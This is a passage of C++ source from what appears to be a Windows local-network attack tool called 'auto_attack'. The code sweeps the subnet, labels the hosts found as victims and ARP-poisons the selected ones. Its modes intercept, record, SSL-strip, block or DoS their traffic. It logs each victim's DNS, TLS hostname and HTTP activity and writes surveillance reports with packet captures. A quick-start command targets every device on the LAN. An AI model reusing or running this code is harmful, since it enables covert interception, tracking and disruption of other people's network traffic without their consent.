                    break;
                }
        }
    }
    PF("[*] name-service replies received: %d\n", replies);

    int missing = 0;
    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        for (auto& v : g_victims) if (v.name.empty()) missing++;
    }
    if (missing > 0) {
        PF("[*] asking windows resolver for %d unnamed host(s)...\n", missing);
        struct Job { std::string ip; std::string out; std::atomic<bool> done{false}; };
        std::vector<std::shared_ptr<Job>> jobs;
        {
            std::lock_guard<std::mutex> lk(g_vmutex);
            for (auto& v : g_victims) {
                if (!v.name.empty()) continue;
                auto j = std::make_shared<Job>();
                j->ip = v.ip;
                jobs.push_back(j);
            }
        }
        for (auto& j : jobs) {
            std::thread([j]() {
                addrinfo hints{}, *res = nullptr;
                hints.ai_family = AF_INET;
                hints.ai_flags = NI_NAMEREQD;
                char host[256] = {0};
                if (getaddrinfo(j->ip.c_str(), nullptr, &hints, &res) == 0 && res) {
                    if (getnameinfo(res->ai_addr, (socklen_t)res->ai_addrlen,
                                    host, sizeof(host), nullptr, 0, NI_NAMEREQD) == 0)
                        j->out = host;
                    freeaddrinfo(res);
                }
                j->done = true;
            }).detach();
        }
        DWORD end2 = GetTickCount() + 1200;
        while ((LONG)(end2 - GetTickCount()) > 0) {
            bool all = true;
            for (auto& j : jobs) if (!j->done) { all = false; break; }
            if (all) break;
            Sleep(50);
        }
        int got = 0;
        std::unordered_map<std::string, std::shared_ptr<Job>> byIp;
        for (auto& j : jobs) byIp[j->ip] = j;
        std::lock_guard<std::mutex> lk(g_vmutex);
        for (auto& v : g_victims) {
            if (!v.name.empty()) continue;
            auto it = byIp.find(v.ip);
            if (it == byIp.end()) continue;
            if (it->second->done && !it->second->out.empty()) {
                std::string nm = it->second->out;
                sanitizeName(nm);
                if (!nm.empty()) { v.name = nm; v.namePrio = 1; got++; }
            }
        }
        if (got) PF("[+] windows resolver named %d more host(s)\n", got);
    }

    // last resort, and only when something is still unnamed: ask
    // TVs/printers/routers over SSDP/UPnP (this does slow HTTP fetches)
    {
        bool missing2 = false;
        {
            std::lock_guard<std::mutex> lk(g_vmutex);
            for (auto& v : g_victims) if (v.name.empty()) { missing2 = true; break; }
        }
        if (missing2) learnFromSsdp(snap);
    }

    int named = 0, total = 0;
    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        total = (int)g_victims.size();
        for (auto& v : g_victims) if (!v.name.empty()) named++;
    }
    if (named == 0 && replies == 0)
        PF("[!] no name replies - udp 137/5353/5355/53 may be filtered\n");
    PF("[+] %d/%d host(s) named (names keep updating passively)\n", named, total);
}

static void startAttack() {
    if (g_starting.exchange(true)) {
        PF("[*] attack is already starting\n");
        return;
    }
    struct StartingReset {
        ~StartingReset() { g_starting = false; }
    } startingReset;

    attackOn = true;
    int n = 0;
    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        for (auto& v : g_victims) if (v.sel) n++;
    }
    if (n == 0) { PF("[!] no targets selected\n"); attackOn = false; return; }

    // a zero gateway MAC would make every poison frame useless (and the
    // repair frames actively harmful), so resolve it once more and refuse
    if (macZero(g_gatewayMac)) {
        unsigned char m[6] = {0};
        if (getMacFromArpCache(g_gatewayIp.c_str(), m) && !macZero(m))
            memcpy(g_gatewayMac, m, 6);
    }
    if (macZero(g_gatewayMac)) {
        attackOn = false;
        PF("[!] gateway MAC for %s is unknown - attack not started.\n"
           "    check the adapter / cable / Wi-Fi and scan again.\n",
           g_gatewayIp.c_str());
        return;
    }

    PF("[+] starting mode %d with %d target(s)\n", (int)g_mode, n);
    if (g_mode == MODE_INTERCEPT || g_mode == MODE_TAP ||
        g_mode == MODE_RECORD || g_mode == MODE_STRIP) {
        if (!g_forwardingEnabled) {
            if (enableForwarding(true)) PF("[+] ip forwarding enabled\n");
            else {
                attackOn = false;
                PF("[!] could not enable IP forwarding - attack aborted.\n"
                   "    run as administrator; otherwise the victim loses\n"
                   "    internet instead of being intercepted.\n");
                return;
            }
        }
    } else {
        // block / dos: cut the victim - forwarding must be off
        if (g_forwardingEnabled) {
            if (enableForwarding(false)) PF("[+] forwarding disabled (block/dos)\n");
            else PF("[!] could not disable forwarding - the block may not work\n");
        }
    }
    if (g_mode == MODE_DOS) {
        std::vector<std::string> targets;
        {
            std::lock_guard<std::mutex> lk(g_vmutex);
            for (auto& v : g_victims) if (v.sel) targets.push_back(v.ip);
        }
        for (auto& t : targets) startDos(t);
    }
    for (int i = 0; i < 10; ++i) { poisonSelected(); Sleep(200); }
    PF("[+] poisoning active\n");
}

// Devices already in the OS neighbour/ARP cache are known instantly; loading
// them before the ARP sweep makes a re-scan show the whole LAN immediately
// instead of waiting for every device to answer a probe.
static void warmFromArpCache() {
    ULONG size = 0;
    if (GetIpNetTable(nullptr, &size, TRUE) != ERROR_INSUFFICIENT_BUFFER) return;
    PMIB_IPNETTABLE t = (PMIB_IPNETTABLE)malloc(size);
    if (!t) return;
    if (GetIpNetTable(t, &size, TRUE) != NO_ERROR) { free(t); return; }
    std::string base = g_myIp;
    size_t dot = base.find_last_of('.');
    if (dot == std::string::npos) { free(t); return; }
    base = base.substr(0, dot);
    int added = 0;
    for (DWORD i = 0; i < t->dwNumEntries; ++i) {
        MIB_IPNETROW& r = t->table[i];
        if (r.dwPhysAddrLen != 6) continue;
        if (r.bPhysAddr[0] == 0 && r.bPhysAddr[1] == 0 && r.bPhysAddr[2] == 0 &&
            r.bPhysAddr[3] == 0 && r.bPhysAddr[4] == 0 && r.bPhysAddr[5] == 0)
            continue;
        struct in_addr a;
        a.s_addr = r.dwAddr;             // already network byte order
        char ip[32];
        snprintf(ip, sizeof(ip), "%s", inet_ntoa(a));
        // only this subnet: the neighbour table can hold other adapters' rows
        if (strncmp(ip, base.c_str(), base.size()) != 0 || ip[base.size()] != '.')
            continue;
        char mac[24];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 r.bPhysAddr[0], r.bPhysAddr[1], r.bPhysAddr[2],
                 r.bPhysAddr[3], r.bPhysAddr[4], r.bPhysAddr[5]);
        if (learnVictim(ip, mac)) added++;
    }
    free(t);
    if (added) PF("[*] %d host(s) preloaded from the ARP cache\n", added);
}

// scan runs on its own thread so the command loop (and therefore _dump /
// status) stays responsive while the network is being swept
static void scanNetworkBody() {
    std::string base = g_myIp;
    size_t last = base.find_last_of('.');
    if (last == std::string::npos) {
        g_scanning = false;
        g_quickStartPending = false;
        return;
    }
    base = base.substr(0, last);
    PF("[*] scanning %s.0/24 ...\n", base.c_str());

    warmFromArpCache();

    // parallel ARP sweep: a handful of distinct send handles, each covering a
    // slice of the subnet.  Only the first round should need to wake sleeping
    // devices, so the second round uses a much shorter settling pause.
    std::vector<pcap_t*> senders;
    for (int t = 0; t < 4; ++t) {
        pcap_t* h = openHandleFor(g_ifGuid, true);
        if (h) senders.push_back(h);
    }
    if (senders.empty()) senders.push_back(nullptr);   // fall back to shared handle

    const int step = (int)senders.size();
    for (int round = 0; round < 2; ++round) {
        std::vector<std::thread> ts;
        for (int t = 0; t < step; ++t) {
            pcap_t* h = senders[t];
            ts.emplace_back([h, t, step, base]() {
                for (int i = 1 + t; i < 255; i += step) {
                    char ip[16];
                    snprintf(ip, sizeof(ip), "%s.%d", base.c_str(), i);
                    sendArp(h, g_myIp.c_str(), g_myMac, nullptr, ip, 1);
                }
            });
        }
        for (auto& th : ts) th.join();
        // a short second sweep catches devices that were slow to answer
        Sleep(round == 0 ? 350 : 900);
    }
    for (pcap_t* h : senders) if (h) pcap_close(h);
    resolveNames();

    std::vector<Victim> snap;
    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        // drop stale hosts, but never one that is selected (or being attacked)
        DWORD now = GetTickCount();
        g_victims.erase(std::remove_if(g_victims.begin(), g_victims.end(),
            [now](const Victim& v) {
                return !v.sel && v.lastSeen && (now - v.lastSeen) > 600000;
            }), g_victims.end());

        // auto-select everything the first time so "Scan" is enough to get
        // going; on later scans keep whatever the user picked (a re-scan must
        // never silently start poisoning devices the user did not choose)
        bool anySel = false;
        for (auto& v : g_victims) { if (v.sel) { anySel = true; break; } }
        if (!anySel) for (auto& v : g_victims) v.sel = true;
        snap = g_victims;
    }
    PF("[+] %zu device(s):\n", snap.size());
    for (size_t i = 0; i < snap.size(); ++i) {
        std::string nm = snap[i].name.empty() ? "-" : snap[i].name;
        PF("    %2zu  %-15s  %-17s  %-24s %s\n", i + 1,
           snap[i].ip.c_str(), snap[i].mac.c_str(),
           nm.c_str(), snap[i].sel ? "[x]" : "[ ]");
    }
    if (!snap.empty())
        PF("[*] next: 't all' then 'g' to intercept\n");

    // "gg" (Quick Start) was waiting for this scan: select everything and go
    if (g_running && g_quickStartPending.exchange(false)) {
        {
            std::lock_guard<std::mutex> lk(g_vmutex);
            for (auto& v : g_victims) v.sel = true;
        }
        g_mode = MODE_INTERCEPT;
        PF("[+] quick start: all devices selected, mode 1\n");
        startAttack();
    }
    g_scanning = false;
}

static void startScan() {
    if (g_scanning.exchange(true)) { PF("[*] scan already in progress\n"); return; }
    if (g_scanThread.joinable()) g_scanThread.join();
    g_scanThread = std::thread(scanNetworkBody);
}

static void selectTargets(const std::string& spec) {
    std::lock_guard<std::mutex> lk(g_vmutex);
    if (spec == "all") {
        for (auto& v : g_victims) v.sel = true;
    } else if (spec == "none") {
        for (auto& v : g_victims) v.sel = false;
    } else {
        std::stringstream ss(spec);
        std::string tok;
        while (std::getline(ss, tok, ',')) {
            tok = trim(tok);
            if (tok.empty()) continue;
            size_t dash = tok.find('-');
            if (dash != std::string::npos) {
                int a = atoi(tok.substr(0, dash).c_str());
                int b = atoi(tok.substr(dash + 1).c_str());
                if (a > b) std::swap(a, b);
                for (int i = a; i <= b; ++i)
                    if (i >= 1 && i <= (int)g_victims.size())
                        g_victims[i - 1].sel = true;
            } else if (tok.find('.') != std::string::npos) {
                for (auto& v : g_victims) if (v.ip == tok) v.sel = true;
            } else {
                int idx = atoi(tok.c_str());
                if (idx >= 1 && idx <= (int)g_victims.size())
                    g_victims[idx - 1].sel = true;
            }
        }
    }
    int n = 0;
    for (auto& v : g_victims) if (v.sel) n++;
    PF("[+] %d target(s) selected\n", n);
}

static void poisonSelected() {
    std::vector<Victim> snap;
    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        for (auto& v : g_victims) if (v.sel) snap.push_back(v);
    }
    for (auto& v : snap) {
        unsigned char vmac[6] = {0};
        parseMac(v.mac, vmac);
        if (macZero(vmac)) continue;
        sendArp(nullptr, g_gatewayIp.c_str(), g_myMac, vmac, v.ip.c_str(), 2);
        if (poisonGatewaySide() && !macZero(g_gatewayMac))
            sendArp(nullptr, v.ip.c_str(), g_myMac, g_gatewayMac,
                    g_gatewayIp.c_str(), 2);
    }
}

static void restoreAll() {
    std::vector<Victim> snap;
    { std::lock_guard<std::mutex> lk(g_vmutex); snap = g_victims; }
    int n = 0;
    for (auto& v : snap) {
        unsigned char vmac[6] = {0};
        parseMac(v.mac, vmac);
        if (macZero(vmac)) continue;
        for (int i = 0; i < 3; ++i) {
            // never claim "the gateway is at 00:00:00:00:00:00" - that would
            // break the victim instead of repairing it
            if (!macZero(g_gatewayMac))
                sendArp(nullptr, g_gatewayIp.c_str(), g_gatewayMac, vmac, v.ip.c_str(), 2);
            sendArp(nullptr, v.ip.c_str(), vmac, g_gatewayMac, g_gatewayIp.c_str(), 2);
            Sleep(10);
        }
        n++;
    }
    PF("[*] ARP restored for %d host(s)\n", n);
}

// ---------------------------------------------------------------
// manual device names: atk\names.txt, one "ip<TAB>name" per line.  They are
// applied with the highest priority so a label the operator typed is never
// replaced by an mDNS/DHCP guess.
// ---------------------------------------------------------------
static const char* NAMES_FILE = "atk\\names.txt";

static void loadManualNames() {
    FILE* f = fopen(NAMES_FILE, "rb");
    if (!f) return;
    char line[256];
    std::vector<std::pair<std::string, std::string>> pairs;
    while (fgets(line, sizeof(line), f)) {
        std::string s(line);
        while (!s.empty() && (s.back() == '\r' || s.back() == '\n')) s.pop_back();
        if (s.empty() || s[0] == '#') continue;
        size_t t = s.find('\t');
        if (t == std::string::npos) t = s.find(' ');
        if (t == std::string::npos) continue;
        std::string ip = s.substr(0, t);
        std::string nm = s.substr(t + 1);
        while (!nm.empty() && (nm.front() == ' ' || nm.front() == '\t')) nm.erase(0, 1);
        if (ip.empty() || nm.empty()) continue;
        pairs.push_back({ip, nm});
    }
    fclose(f);
    if (pairs.empty()) return;
    {
        std::lock_guard<std::mutex> lk(g_manualMutex);
        for (auto& p : pairs) g_manualNames[p.first] = p.second;
    }
    std::lock_guard<std::mutex> lk(g_vmutex);
    for (auto& p : pairs)
        for (auto& v : g_victims)
            if (v.ip == p.first) { v.name = p.second; v.namePrio = 9; break; }
    refreshVictimIpSnapLocked();
    PF("[*] %zu manual name(s) loaded\n", pairs.size());
}

static void cmdName(const std::string& ip, const std::string& name) {
    if (ip.empty()) { PF("usage: name <ip> <text|clear>\n"); return; }
    {
        std::lock_guard<std::mutex> lk(g_manualMutex);
        if (name.empty() || name == "clear" || name == "-") g_manualNames.erase(ip);
        else g_manualNames[ip] = name;
    }
    // rewrite the file from the current map so entries stay unique
    {
        std::lock_guard<std::mutex> lk(g_manualMutex);
        FILE* f = fopen(NAMES_FILE, "wb");
        if (f) {
            for (auto& kv : g_manualNames)
                fprintf(f, "%s\t%s\n", kv.first.c_str(), kv.second.c_str());
            fclose(f);
        }
    }
    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        for (auto& v : g_victims)
            if (v.ip == ip) {
                if (name.empty() || name == "clear" || name == "-") {
                    v.name.clear(); v.namePrio = 0;
                } else { v.name = name; v.namePrio = 9; }
                break;
            }
    }
    if (name.empty() || name == "clear" || name == "-")
        PF("[+] name cleared for %s\n", ip.c_str());
    else
        PF("[+] %s is now \"%s\" (manual, saved)\n", ip.c_str(), name.c_str());
}

static const char* nameSource(int prio) {
    switch (prio) {
        case 9:  return "manual";
        case 6:  return "upnp";
        case 5:  return "dhcp";
        case 4:  return "netbios";
        case 3:  return "llmnr";
        case 2:  return "mdns";
        case 1:  return "dns";
        case 0:  return "vendor";
        default: return "?";
    }
}

static void saveRules() {
    FILE* f = fopen(RULES_FILE, "w");
    if (!f) { PF("[-] save failed: %s\n", RULES_FILE); return; }
    std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
    for (auto& r : g_dnsRules)
        fprintf(f, "%s\t%s\t%s\t%s\n",
                r.pattern.c_str(), r.action.c_str(),
                r.targetIp.c_str(), r.victim.c_str());
    fclose(f);
    PF("[+] saved %zu rule(s) to %s\n", g_dnsRules.size(), RULES_FILE);
}

static void loadRules() {
    FILE* f = fopen(RULES_FILE, "r");
    if (!f) { PF("[-] no rules file at %s\n", RULES_FILE); return; }
    std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
    g_dnsRules.clear();          // load = replace, so repeated loads don't stack
    char line[512];
    size_t n = 0;
    while (fgets(line, sizeof(line), f)) {
        std::string s = trim(line);
        if (s.empty() || s[0] == '#') continue;
        std::vector<std::string> parts;
        std::stringstream ss(s);
        std::string tok;
        while (std::getline(ss, tok, '\t')) parts.push_back(tok);
        if (parts.size() < 4) continue;
        DnsRule r;
        r.pattern = parts[0]; r.action = parts[1];
        r.targetIp = parts[2]; r.victim = parts[3];
        g_dnsRules.push_back(r);
        n++;
    }
    fclose(f);
    PF("[+] loaded %zu rule(s)\n", n);
}

static void cmdUsers() {
    std::unordered_map<std::string, std::string> names;
    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        for (auto& v : g_victims) if (!v.name.empty()) names[v.ip] = v.name;
    }
    std::lock_guard<std::mutex> lk(g_activityMutex);
    if (g_activity.empty()) { PF("  (no activity yet)\n"); return; }
    PF("  %-16s %-18s %-6s %-6s %-6s %-8s\n",
       "IP", "NAME", "DNS", "SNI", "HTTP", "AGE");
    for (auto& kv : g_activity) {
        auto& a = kv.second;
        DWORD age = a.lastSeen ? (GetTickCount() - a.lastSeen) / 1000 : 0;
        auto it = names.find(a.ip);
        std::string nm = (it != names.end()) ? it->second : "-";
        PF("  %-16s %-18s %-6ld %-6ld %-6ld %-8lus\n",
           a.ip.c_str(), nm.c_str(), a.dnsCount, a.sniCount, a.httpCount, age);
    }
}

static void cmdTop(int n) {
    std::vector<std::pair<long, std::string>> rows;
    {
        std::lock_guard<std::mutex> lk(g_activityMutex);
        for (auto& kv : g_activity) {
            const auto& a = kv.second;
            rows.push_back({a.dnsCount + a.sniCount + a.httpCount, a.ip});
        }
    }
    std::sort(rows.begin(), rows.end(),
              [](auto& a, auto& b){ return a.first > b.first; });
    if (n > (int)rows.size()) n = (int)rows.size();
    PF("  %-16s %-18s %s\n", "IP", "NAME", "EVENTS");
    for (int i = 0; i < n; ++i)
        PF("  %-16s %-18s %ld\n", rows[i].second.c_str(),
           victimName(rows[i].second).c_str(), rows[i].first);
}

static void watchVictim(const std::string& ip) {
    PF("\n  === watching %s ===\n", ip.c_str());
    size_t shown = 0;

    // when driven over pipes (GUI), stdin is not a console: dump the recent
    // events once and return instead of blocking forever
    HANDLE h = GetStdHandle(STD_INPUT_HANDLE);
    DWORD mode = 0;
    bool isConsole = GetConsoleMode(h, &mode) != 0;
    if (!isConsole) {
        std::lock_guard<std::mutex> lk(g_activityMutex);
        auto it = g_activity.find(ip);
        if (it != g_activity.end()) {
            for (auto& line : it->second.recent) PF("  %s\n", line.c_str());
        } else PF("  (no events yet for %s)\n", ip.c_str());
        return;
    }

    for (int i = 0; i < 500 && !attackOn; ++i) Sleep(10);
    while (true) {
        {
            std::lock_guard<std::mutex> lk(g_activityMutex);
            auto it = g_activity.find(ip);
            if (it != g_activity.end()) {
                auto& r = it->second.recent;
                if (shown > r.size()) shown = 0;
                for (size_t k = shown; k < r.size(); ++k)
                    PF("  %s\n", r[k].c_str());
                shown = r.size();
            }
        }
        if (GetConsoleMode(h, &mode)) {
            DWORD ne = 0;
            if (GetNumberOfConsoleInputEvents(h, &ne) && ne > 0) {
                INPUT_RECORD ir; DWORD read = 0;
                PeekConsoleInput(h, &ir, 1, &read);
                if (read > 0 && ir.EventType == KEY_EVENT && ir.Event.KeyEvent.bKeyDown) {
                    ReadConsoleInput(h, &ir, 1, &read);
                    PF("\n  [watch off]\n");
                    break;
                }
            }
        }
        Sleep(400);
    }
}

static void cmdShowTrack(const std::string& ip, int lines) {
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s\\track_%s.log", TRACK_DIR, ip.c_str());
    FILE* f = fopen(path, "r");
    if (!f) { PF("[-] no track log for %s\n", ip.c_str()); return; }
    std::deque<std::string> tail;
    char buf[512];
    while (fgets(buf, sizeof(buf), f)) {
        std::string s = buf;
        while (!s.empty() && (s.back() == '\n' || s.back() == '\r')) s.pop_back();
        tail.push_back(s);
        if ((int)tail.size() > lines) tail.pop_front();
    }
    fclose(f);
    PF("  === %s (last %d) ===\n", path, (int)tail.size());
    for (auto& s : tail) PF("  %s\n", s.c_str());
}

static void cmdStats(const std::string& ip) {
    unsigned long long up = 0, down = 0, pu = 0, pd = 0;
    std::unordered_map<std::string, long> proto, peers;
    bool found = false;
    {
        std::lock_guard<std::mutex> lk(g_activityMutex);
        auto it = g_activity.find(ip);
        if (it != g_activity.end()) {
            Activity& a = it->second;
            up = a.byUp; down = a.byDown; pu = a.pktUp; pd = a.pktDown;
            proto = a.proto; peers = a.peers;
            found = true;
        }
    }
    if (!found) { PF("[-] no traffic for %s yet\n", ip.c_str()); return; }
    PF("  === stats %s ===\n", ip.c_str());
    PF("  up=%llu bytes (%llu pkts)   down=%llu bytes (%llu pkts)\n",
       up, pu, down, pd);

    std::vector<std::pair<long, std::string>> pv;
    for (auto& kv : proto)
        if (kv.second > 0) pv.push_back(std::make_pair(kv.second, kv.first));
    std::sort(pv.begin(), pv.end(),
              [](const std::pair<long, std::string>& x,
                 const std::pair<long, std::string>& y) { return x.first > y.first; });
    std::string line;
    for (auto& x : pv) {
        if (!line.empty()) line += "  ";
        line += x.second + " " + std::to_string(x.first);
    }
    PF("  protocols: %s\n", line.empty() ? "-" : line.c_str());

    std::vector<std::pair<long, std::string>> ev;
    for (auto& kv : peers) ev.push_back(std::make_pair(kv.second, kv.first));
    std::sort(ev.begin(), ev.end(),
              [](const std::pair<long, std::string>& x,
                 const std::pair<long, std::string>& y) { return x.first > y.first; });
    line.clear();
    int shown = 0;
    for (auto& x : ev) {
        if (shown++ >= 8) break;
        if (!line.empty()) line += "  ";
        line += x.second + " (" + std::to_string(x.first) + ")";
    }
    PF("  top peers: %s\n", line.empty() ? "-" : line.c_str());

    std::string bt;
    {
        std::lock_guard<std::mutex> lk(g_activityMutex);
        auto it = g_activity.find(ip);
        if (it != g_activity.end()) bt = bypassText(it->second);
    }
    if (!bt.empty()) PF("  bypass: %s\n", bt.c_str());
}

static void cmdBypass() {
    std::vector<Activity> acts;
    {
        std::lock_guard<std::mutex> lk(g_activityMutex);
        for (auto& kv : g_activity) acts.push_back(kv.second);
    }
    std::sort(acts.begin(), acts.end(),
              [](const Activity& x, const Activity& y) { return x.ip < y.ip; });
    if (acts.empty()) { PF("[-] no activity yet\n"); return; }
    PF("  %-16s %-20s %s\n", "IP", "NAME", "bypass indicators");
    bool any = false;
    for (auto& a : acts) {
        std::string bt = bypassText(a);
        if (bt.empty()) continue;
        any = true;
        PF("  %-16s %-20s %s\n", a.ip.c_str(), victimName(a.ip).c_str(), bt.c_str());
    }
    if (!any)
        PF("  (no bypass indicators - tracked devices appear to use plain DNS)\n");
}

static void cmdDetail(const std::string& ip, int lines) {
    std::deque<std::string> tail;
    long dns = 0, sni = 0, http = 0;
    unsigned long long cap = 0;
    bool full = false;
    {
        std::lock_guard<std::mutex> lk(g_activityMutex);
        auto it = g_activity.find(ip);
        if (it == g_activity.end()) {
            PF("[-] no activity for %s yet\n", ip.c_str());
            return;
        }
        Activity& a = it->second;
        dns = a.dnsCount; sni = a.sniCount; http = a.httpCount;
        cap = a.capBytes; full = a.capFull;
        size_t start = a.recent.size() > (size_t)lines
                     ? a.recent.size() - (size_t)lines : 0;
        for (size_t i = start; i < a.recent.size(); ++i)
            tail.push_back(a.recent[i]);
    }
    PF("  === detail %s ===\n", ip.c_str());
    PF("  dns=%ld sni=%ld http=%ld events=%d pcap=%llu%s\n",
       dns, sni, http, (int)tail.size(), cap, full ? " (full)" : "");
    for (auto& s : tail) PF("  %s\n", s.c_str());
    cmdStats(ip);
}

// list regular files in a directory (non-recursive)
struct ReportFile { std::string name; unsigned long long size; };
static std::vector<ReportFile> listReportFiles(const char* dir, const char* pattern) {
    std::vector<ReportFile> out;
    std::string spec = std::string(dir) + "\\" + pattern;
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(spec.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return out;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        ReportFile e;
        e.name = fd.cFileName;
        e.size = ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        out.push_back(e);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return out;
}

// write atk\report.html and atk\report.json from the current session state
static void cmdReport() {
    std::vector<Victim> vs;
    { std::lock_guard<std::mutex> lk(g_vmutex); vs = g_victims; }
    std::vector<Activity> acts;
    { std::lock_guard<std::mutex> lk(g_activityMutex); for (auto& kv : g_activity) acts.push_back(kv.second); }
    std::vector<DnsRule> rules;
    { std::lock_guard<std::mutex> lk(g_dnsRuleMutex); rules = g_dnsRules; }

    std::string stamp = tsFull();
    CreateDirectoryA("atk", nullptr);

    auto topOf = [](const std::unordered_map<std::string, long>& m,
                    std::string& key, long& val) {
        val = 0; key.clear();
        for (auto& kv : m) if (kv.second > val) { val = kv.second; key = kv.first; }
    };

    // ---- HTML ----
    FILE* f = fopen("atk\\report.html", "wb");
    if (!f) { PF("[-] cannot write atk\\report.html\n"); return; }
    fprintf(f, "<!doctype html><html><head><meta charset=\"utf-8\">"
               "<title>auto_attack report</title>"
               "<style>body{font-family:Segoe UI,Arial,sans-serif;background:#14161a;color:#e6e6e6;margin:24px}"
               "h1{font-size:20px}h2{font-size:15px;margin-top:26px;color:#ffaa3c}"
               "table{border-collapse:collapse;width:100%%;margin-top:8px}"
               "th,td{border:1px solid #333;padding:5px 8px;font-size:12px;text-align:left;vertical-align:top}"
               "th{background:#20242c}.m{color:#8aa}"
               "pre.tl{background:#1b1e24;border:1px solid #333;padding:8px;font-size:12px;"
               "max-height:240px;overflow:auto;white-space:pre-wrap}"
               "a{color:#7cf}</style></head><body>");
    fprintf(f, "<h1>auto_attack &mdash; session report</h1>");
    fprintf(f, "<div class=\"m\">generated %s &middot; this host %s &middot; gateway %s</div>",
            htmlEscape(stamp).c_str(), g_myIp.c_str(), g_gatewayIp.c_str());
    fprintf(f, "<div class=\"m\">mode %d &middot; seen %ld &middot; dns %ld &middot; kills %ld "
               "&middot; re-poisons %ld &middot; gateway MAC changes %ld</div>",
            (int)g_mode, (long)g_seen, (long)g_dnsBlocked, (long)g_kills,
            (long)g_repoisons, (long)g_gwMacChanges);

    fprintf(f, "<h2>Devices (%d)</h2><table>"
               "<tr><th>IP</th><th>MAC</th><th>Name</th><th>OS / type</th>"
               "<th>Open ports</th><th>Banner</th></tr>", (int)vs.size());
    for (auto& v : vs) {
        fprintf(f, "<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>",
                v.ip.c_str(), v.mac.c_str(), htmlEscape(v.name).c_str(),
                htmlEscape(v.osGuess).c_str(), htmlEscape(v.ports).c_str(),
                htmlEscape(v.banner).c_str());
    }
    fprintf(f, "</table>");

    fprintf(f, "<h2>Traffic by device</h2><table>"
               "<tr><th>IP</th><th>DNS</th><th>SNI</th><th>HTTP</th><th>Events</th>"
               "<th>Up</th><th>Down</th><th>Top protocol</th><th>Top peer</th></tr>");
    for (auto& a : acts) {
        std::string pk, ek; long pv = 0, ev = 0;
        topOf(a.proto, pk, pv);
        topOf(a.peers, ek, ev);
        fprintf(f, "<tr><td>%s</td><td>%ld</td><td>%ld</td><td>%ld</td><td>%llu</td>"
                   "<td>%llu</td><td>%llu</td><td>%s</td><td>%s</td></tr>",
                a.ip.c_str(), a.dnsCount, a.sniCount, a.httpCount, a.events,
                a.byUp, a.byDown,
                htmlEscape(pk.empty() ? "-" : pk + " x" + std::to_string(pv)).c_str(),
                htmlEscape(ek.empty() ? "-" : ek + " x" + std::to_string(ev)).c_str());
    }
    fprintf(f, "</table>");

    // bypass indicators: what each device uses to dodge plain interception
    {
        bool any = false;
        for (auto& a : acts) if (!bypassText(a).empty()) { any = true; break; }
        if (any) {
            fprintf(f, "<h2>Bypass indicators</h2><table>"
                       "<tr><th>IP</th><th>Indicator (confidence, packets)</th></tr>");
            for (auto& a : acts) {
                std::string bt = bypassText(a);
                if (bt.empty()) continue;
                fprintf(f, "<tr><td>%s</td><td>%s</td></tr>",
                        a.ip.c_str(), htmlEscape(bt).c_str());
            }
            fprintf(f, "</table>");
            fprintf(f, "<div class=\"m\">QUIC/DoH/DoT are encrypted; when a device uses "
                       "them the DNS names and TLS hostnames above will be missing "
                       "for that traffic.</div>");
        }
    }

    if (!rules.empty()) {
        fprintf(f, "<h2>DNS rules (%d)</h2><table>"
                   "<tr><th>Pattern</th><th>Action</th><th>Target</th><th>Victim</th></tr>",
                (int)rules.size());
        for (auto& r : rules)
            fprintf(f, "<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>",
                    htmlEscape(r.pattern).c_str(), htmlEscape(r.action).c_str(),
                    htmlEscape(r.targetIp).c_str(), htmlEscape(r.victim).c_str());
        fprintf(f, "</table>");
    }

    // per-device recent activity (the events each device generated)
    {
        bool any = false;
        for (auto& a : acts) if (!a.recent.empty()) { any = true; break; }
        if (any) {
            fprintf(f, "<h2>Recent activity (timeline)</h2>");
            for (auto& a : acts) {
                if (a.recent.empty()) continue;
                std::string nm;
                for (auto& v : vs) if (v.ip == a.ip) { nm = v.name; break; }
                fprintf(f, "<h3>%s%s%s</h3><pre class=\"tl\">",
                        htmlEscape(a.ip).c_str(),
                        nm.empty() ? "" : " &middot; ",
                        htmlEscape(nm).c_str());
                size_t start = a.recent.size() > 40 ? a.recent.size() - 40 : 0;
                for (size_t k = start; k < a.recent.size(); ++k)
                    fprintf(f, "%s<br>", htmlEscape(a.recent[k]).c_str());
                fprintf(f, "</pre>");
            }
        }
    }

    // captures and logs produced this session, linked with relative paths
    {
        std::vector<ReportFile> caps = listReportFiles("atk\\captures", "*.pcap");
        std::vector<ReportFile> logs = listReportFiles("atk\\tracks", "track_*.log");
        if (!caps.empty() || !logs.empty()) {
            fprintf(f, "<h2>Captures &amp; logs</h2><table>"
                       "<tr><th>File</th><th>Size</th></tr>");
            for (auto& c : caps)
                fprintf(f, "<tr><td><a href=\"captures/%s\">captures/%s</a></td>"
                           "<td>%llu B</td></tr>",
                        htmlEscape(c.name).c_str(), htmlEscape(c.name).c_str(), c.size);
            for (auto& l : logs)
                fprintf(f, "<tr><td><a href=\"tracks/%s\">tracks/%s</a></td>"
                           "<td>%llu B</td></tr>",
                        htmlEscape(l.name).c_str(), htmlEscape(l.name).c_str(), l.size);
            fprintf(f, "</table>");
            fprintf(f, "<div class=\"m\">pcap files open in Wireshark; track logs are plain text.</div>");
        }
    }

    fprintf(f, "</body></html>");
    fclose(f);

    // ---- JSON ----
    FILE* j = fopen("atk\\report.json", "wb");
    if (j) {
        auto jesc = [](const std::string& s) {
            std::string o;
            for (char c : s) {
                if (c == '"' || c == '\\') { o += '\\'; o += c; }
                else if (c == '\n') o += "\\n";
                else if (c == '\r') o += "\\r";
                else if (c == '\t') o += "\\t";
                else o += c;
            }
            return o;
        };
